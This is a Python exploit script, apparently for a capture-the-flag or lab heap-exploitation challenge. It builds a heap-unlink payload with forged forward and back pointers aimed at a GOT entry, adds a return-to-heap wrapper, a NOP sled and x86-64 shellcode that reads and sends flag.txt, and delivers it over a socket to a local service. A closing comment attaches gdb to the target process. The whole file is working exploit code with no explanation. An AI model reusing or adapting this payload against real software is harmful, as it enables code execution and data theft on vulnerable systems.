import sys
from struct import pack
from pwn import *
import socket

def get_payload_cat():
	return b"j\x01\xfe\x0c\x24H\xb8flag.txtPj\x02XH\x89\xe71\xf6\x99\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05" 

def make_payload():
	ropchain 			= get_payload_cat() #len = 45
	memChunkA 			= 0x605420 
	payload_wrapper 	= b"\x90\x90\x68\xf0\x54\x60\x00\xc3" # nop-nop-push 0x6054f0-ret
	puts_entryMinus24	= 0x6047f8 - 0x18
	wrapperAddr 		= memChunkA + 0x10
	fake_size 			= 0x110

	payload  = b""
	payload += puts_entryMinus24.to_bytes(8,'little', signed=False) 	    #fd pointer
	payload += wrapperAddr.to_bytes(8,'little', signed=False)				#bk pointer
	payload += payload_wrapper			
	payload += b"\x90" * (256 - (len(ropchain) + len(payload)))									
	payload += ropchain																					
	payload += fake_size.to_bytes(8,'little', signed=False)			
	payload += fake_size.to_bytes(8,'little', signed=False)			

	return payload
	
def main():	
	s = socket.create_connection(("localhost",7000))
	ls = s.recv(64)
	s.send(make_payload())
	ls = s.recv(256)
	print(ls)
	s.close()

if __name__ == '__main__':
	main()


#sudo gdb server_0 --pid=$(pidof server_0) --nx -x init.gdb